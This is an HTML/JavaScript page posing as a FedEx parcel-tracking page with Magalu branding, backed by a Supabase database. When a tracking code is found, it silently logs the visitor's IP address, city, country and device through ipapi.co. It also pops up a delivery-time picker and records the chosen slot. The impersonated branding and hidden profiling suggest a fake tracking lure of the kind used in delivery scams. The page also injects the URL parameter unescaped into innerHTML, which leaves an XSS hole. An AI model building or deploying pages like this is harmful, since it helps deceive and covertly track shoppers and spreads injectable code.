<!DOCTYPE html>

<html lang="pt-BR">

<head>

<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>FedEx - Rastreamento</title>

<link rel="stylesheet" href="/css/style.css">

<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>

<style>

.horarioBtn{
padding:8px 12px;
margin:5px;
border:none;
border-radius:6px;
background:#ff6a00;
color:white;
cursor:pointer;
}

.horarioBtn:hover{
opacity:0.9;
}

</style>

</head>

<body>

<div class="tracking-container">

<div class="tracking-content">

<div class="tracking-main-card">

<div class="tracking-header">
<div class="tracking-logo">
<img src="/fedex.png" class="tracking-header-logo">
</div>
</div>

<div class="tracking-code-label">
Seu código de rastreamento
</div>

<div id="codigo" class="tracking-code"></div>

<div class="tracking-info-section">
<div class="tracking-info-item">
<span class="info-label">Destinatário</span>
<span id="destinatario" class="info-value"></span>
</div>
</div>

<div class="tracking-address-section">
<div class="address-header">
<span class="address-label">Endereço de Entrega</span>
</div>
<div id="endereco" class="address-value"></div>
</div>

<div class="tracking-update-bar">
Última atualização em: <span id="atualizacao"></span>
</div>

</div>

<div class="tracking-help-card">

<div class="help-title">
Precisa de Ajuda?
</div>

<button class="help-button support">
Escolher horário de entrega
</button>

<button class="help-button faq">
Perguntas Frequentes
</button>

</div>

<div id="timeline" class="tracking-timeline"></div>

</div>

<div class="tracking-logos">
<img src="/fedex.png" class="tracking-logo-fedex">
<img src="/logo-magalu-azul (1).png" class="tracking-logo-magalu">
</div>

</div>

<!-- MODAL HORARIO ENTREGA -->

<div id="modalHorario" style="
display:none;
position:fixed;
top:0;
left:0;
width:100%;
height:100%;
background:rgba(0,0,0,0.5);
align-items:center;
justify-content:center;
z-index:9999;
">

<div style="
background:white;
padding:30px;
border-radius:10px;
width:320px;
text-align:center;
box-shadow:0 0 20px rgba(0,0,0,0.2);
">

<h3>Escolher horário de entrega</h3>

<p style="font-size:14px;color:#555;">
Selecione o melhor horário para receber seu pacote
</p>

<div style="margin-top:20px">

<button class="horarioBtn">10:00</button> <button class="horarioBtn">11:00</button> <button class="horarioBtn">13:00</button> <button class="horarioBtn">14:00</button> <button class="horarioBtn">15:00</button> <button class="horarioBtn">16:00</button> <button class="horarioBtn">17:00</button> <button class="horarioBtn">18:00</button> <button class="horarioBtn">19:00</button>

</div>

<br>

<button onclick="fecharHorario()" style="
background:#ccc;
padding:8px 15px;
border:none;
border-radius:6px;
cursor:pointer;
">
Cancelar </button>

</div>

</div>

<script>

const SUPABASE_URL="https://opiwznepfjcinxrymrxw.supabase.co"
const SUPABASE_KEY="sb_publishable_F7z4q7UuxxNc13r4rDubZA_LsFF1fEB"

const db = window.supabase.createClient(
SUPABASE_URL,
SUPABASE_KEY
)

const params = new URLSearchParams(window.location.search)
const code = params.get("code")

document.getElementById("codigo").innerText = code


function formatarDataBrasil(data){
return new Date(data).toLocaleString("pt-BR",{
timeZone:"America/Sao_Paulo"
})
}


// REGISTRAR VISUALIZAÇÃO

async function registrarVisualizacao(code){

try{

const geo = await fetch("https://ipapi.co/json/")
const geoData = await geo.json()

const device = navigator.userAgent

await db
.from("tracking_views")
.insert([
{
code:code,
ip:geoData.ip,
city:geoData.city,
country:geoData.country_name,
device:device,
viewed_at:new Date().toISOString(),
delivery_time:null
}
])

}catch(e){

console.log("erro ao registrar visualização")

}

}



async function carregar(){

const {data,error} = await db
.from("trackings_test")
.select("*")
.eq("code",code)
.single()

if(error || !data){

document.getElementById("timeline").innerHTML=`

<div class="tracking-error-message">

<div class="error-icon">⚠️</div>

<div class="error-title">
Rastreamento não encontrado
</div>

<p class="error-text">
O código <strong>${code}</strong> não foi localizado.
</p>

<p class="error-text">
Verifique o número e tente novamente.
</p>

</div>

`

return
}


// REGISTRA VISUALIZAÇÃO
registrarVisualizacao(code)


document.getElementById("destinatario").innerText = data.recipient_name
document.getElementById("endereco").innerText = data.address


const ultimoEvento = data.timeline[data.timeline.length - 1]

document.getElementById("atualizacao").innerText =
formatarDataBrasil(ultimoEvento.date)


const timeline = document.getElementById("timeline")

timeline.innerHTML=""

data.timeline.forEach((evento,index)=>{

timeline.innerHTML+=`

<div class="timeline-item ${index==data.timeline.length-1 ? "active":""}">

<div class="timeline-dot"></div>

<div class="timeline-content">

<div class="timeline-date">
${formatarDataBrasil(evento.date)}
</div>

<div class="timeline-status">
${evento.title}
</div>

<div class="timeline-description">
${evento.description}
</div>

<div class="timeline-location">
📍 ${evento.location}
</div>

</div>

</div>

`

})

}

carregar()


// ABRIR MODAL APENAS UMA VEZ POR DISPOSITIVO

const horarioSalvo = localStorage.getItem("horarioEscolhido_"+code)

if(!horarioSalvo){
abrirHorario()
}


document.querySelector(".help-button.support")
.addEventListener("click",abrirHorario)


function abrirHorario(){
document.getElementById("modalHorario").style.display="flex"
}


function fecharHorario(){
document.getElementById("modalHorario").style.display="none"
}


// SALVAR HORARIO ESCOLHIDO

document.querySelectorAll(".horarioBtn").forEach(btn=>{

btn.onclick=async function(){

const horario=this.innerText

// salva no navegador
localStorage.setItem("horarioEscolhido_"+code,horario)

await db
.from("tracking_views")
.update({
delivery_time:horario
})
.eq("code",code)
.order("viewed_at",{ascending:false})
.limit(1)

fecharHorario()

alert("Horário de entrega escolhido: "+horario)

}

})

</script>

</body>
</html>
